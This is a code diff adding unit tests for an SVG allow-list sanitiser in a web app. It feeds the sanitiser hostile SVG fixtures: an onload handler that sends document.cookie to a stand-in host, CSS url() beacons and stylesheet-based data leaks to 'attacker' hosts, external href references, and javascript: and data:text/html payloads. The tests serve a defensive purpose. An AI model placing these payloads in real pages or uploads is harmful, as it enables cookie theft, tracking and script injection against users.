@@ -16,7 +16,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 
 import {
-  canReadDocument, parseDelimited, resolveFrom, colIndex, slideNo,
+  canReadDocument, parseDelimited, resolveFrom, colIndex, slideNo, scrub,
 } from '../web/assets/js/ui/documents.ts';
 
 test('it claims the formats it has readers for', () => {
@@ -134,4 +134,169 @@ test('other delimiters work the same', () => {
 
 test('an empty file has no rows', () => {
   assert.deepEqual(parseDelimited('', ','), []);
+});
+
+// ---------------------------------------------------------------------------
+// scrub() - the SVG allow-list
+//
+// CLAUDE.md names this as the app's single exception to "nothing that reads a
+// foreign document may touch innerHTML": an SVG is parsed detached and walked,
+// and what survives the walk is imported into the page. It is the only place a
+// stranger's markup is admitted at all, and it had no test in either direction
+// - tests/csp.test.js asserts the policy that is supposed to be the *second*
+// lock, and the first one was defended by nothing.
+//
+// A fake element rather than a DOM, the way tests/markdown.test.js and
+// tests/trash.test.js do it. It records only what scrub() touches: a local
+// name, an attribute map, children, and text.
+// ---------------------------------------------------------------------------
+
+class El {
+  constructor(localName, attrs = {}, children = []) {
+    this.localName = localName;
+    this._attrs = new Map(Object.entries(attrs));
+    this._children = children;
+    this.text = '';
+    for (const c of children) c.parent = this;
+  }
+
+  get attributes() {
+    return [...this._attrs].map(([name, value]) => ({ name, value }));
+  }
+
+  get children() { return this._children; }
+
+  removeAttribute(name) { this._attrs.delete(name); }
+  getAttribute(name) { return this._attrs.get(name) ?? null; }
+  has(name) { return this._attrs.has(name); }
+  remove() {
+    const kids = this.parent?._children;
+    if (kids) kids.splice(kids.indexOf(this), 1);
+  }
+
+  replaceChildren() { this._children = []; }
+  set textContent(v) { this.text = String(v); this._children = []; }
+  get textContent() { return this.text; }
+
+  /** Every element in this subtree, for asserting over the whole result. */
+  all(out = []) {
+    out.push(this);
+    for (const c of this._children) c.all(out);
+    return out;
+  }
+}
+
+test('the root element is scrubbed, not only its children', () => {
+  // `<svg onload="...">` is the classic form and it survived: the walk iterated
+  // node.children and never looked at the node it was handed, so every
+  // attribute on the document element went into the page verbatim.
+  const root = new El('svg', {
+    xmlns: 'http://www.w3.org/2000/svg',
+    onload: "fetch('//x/' + document.cookie)",
+    style: 'background:url(//x/beacon)',
+  });
+  scrub(root);
+  assert.equal(root.has('onload'), false, 'an onload handler on the root survived');
+  assert.equal(root.has('style'), false, 'a style attribute on the root survived');
+  assert.equal(root.has('xmlns'), true, 'the namespace is not a reference and stays');
+});
+
+test('an event handler is dropped wherever it is', () => {
+  const root = new El('svg', {}, [
+    new El('rect', { onclick: 'alert(1)', fill: 'red' }),
+    new El('g', {}, [new El('circle', { onmouseover: 'alert(1)' })]),
+  ]);
+  scrub(root);
+  for (const node of root.all()) {
+    for (const { name } of node.attributes) {
+      assert.ok(!name.startsWith('on'), `${node.localName} kept ${name}`);
+    }
+  }
+  assert.equal(root.children[0].getAttribute('fill'), 'red', 'and the drawing survives');
+});
+
+test('a style attribute is a reference to somewhere else', () => {
+  // The module header says "every attribute that is a reference to somewhere
+  // else is dropped", and the filter had no case for `style` - so
+  // style="fill:url(//attacker/track.svg#a)" on any allowed child reached the
+  // page and made the request.
+  const root = new El('svg', {}, [new El('rect', { style: 'fill:url(//attacker/track.svg#a)' })]);
+  scrub(root);
+  assert.equal(root.children[0].has('style'), false);
+});
+
+test('a style element is emptied, because its CSS is not scoped to the drawing', () => {
+  // An inline <style> inside an SVG subtree is a *document* stylesheet. SVG_OK
+  // carries 'style' and nothing ever filtered text content, so an opened
+  // drawing could restyle and leak from the whole app.
+  const style = new El('style', {});
+  style.text = '*{display:none} input[value^="a"]{background:url(//x/a)}';
+  const root = new El('svg', {}, [style]);
+  scrub(root);
+  assert.equal(root.children.length, 1, 'kept, so the tree still reads as itself');
+  assert.equal(root.children[0].textContent, '', 'and carries no rules');
+});
+
+test('an xlink href is caught under any prefix the file chose', () => {
+  // The test named `xlink:href` literally, and a prefix is the author's to
+  // choose: binding the same namespace as `xl:` kept the attribute.
+  const root = new El('svg', {}, [
+    new El('use', { 'xlink:href': 'https://attacker/x.svg#a' }),
+    new El('use', { 'xl:href': 'https://attacker/x.svg#a' }),
+    new El('use', { 'href': 'https://attacker/x.svg#a' }),
+  ]);
+  scrub(root);
+  for (const use of root.children) {
+    assert.deepEqual(use.attributes, [], `${JSON.stringify(use.attributes)} survived`);
+  }
+});
+
+test('a fragment reference is the one form kept', () => {
+  // <use href="#thing"> is how an SVG refers to its own parts, and dropping it
+  // would break every legitimate symbol.
+  const root = new El('svg', {}, [new El('use', { href: '#thing' })]);
+  scrub(root);
+  assert.equal(root.children[0].getAttribute('href'), '#thing');
+});
+
+test('an element that is not on the allow-list is dropped whole', () => {
+  const root = new El('svg', {}, [
+    new El('script', {}, [new El('path', {})]),
+    new El('foreignObject', {}),
+    new El('path', { d: 'M0 0' }),
+  ]);
+  scrub(root);
+  assert.deepEqual(root.children.map(c => c.localName), ['path']);
+});
+
+test('javascript: and data:text/html are refused in any attribute', () => {
+  const root = new El('svg', {}, [
+    new El('a', { href: 'javascript:alert(1)' }),
+    new El('rect', { fill: 'data:text/html,<script>alert(1)</script>' }),
+  ]);
+  scrub(root);
+  for (const node of root.all()) assert.deepEqual(node.attributes, []);
+});
+
+test('a tree deeper than the cap is emptied rather than overflowing the stack', { timeout: 5000 }, () => {
+  let node = new El('path', {});
+  for (let i = 0; i < 2000; i++) node = new El('g', {}, [node]);
+  const root = new El('svg', {}, [node]);
+  assert.doesNotThrow(() => scrub(root));
+});
+
+test('an ordinary drawing comes through unchanged', () => {
+  // The half that matters as much as the refusals: a sanitiser that eats real
+  // files is a sanitiser people turn off.
+  const root = new El('svg', { xmlns: 'http://www.w3.org/2000/svg', viewBox: '0 0 16 16' }, [
+    new El('g', { fill: 'none', stroke: 'currentColor' }, [
+      new El('path', { d: 'M1 1 L15 15', 'stroke-width': '2' }),
+      new El('circle', { cx: '8', cy: '8', r: '4' }),
+    ]),
+  ]);
+  scrub(root);
+  assert.equal(root.getAttribute('viewBox'), '0 0 16 16');
+  assert.equal(root.children[0].getAttribute('stroke'), 'currentColor');
+  assert.equal(root.children[0].children[0].getAttribute('d'), 'M1 1 L15 15');
+  assert.equal(root.children[0].children[1].getAttribute('r'), '4');
 });
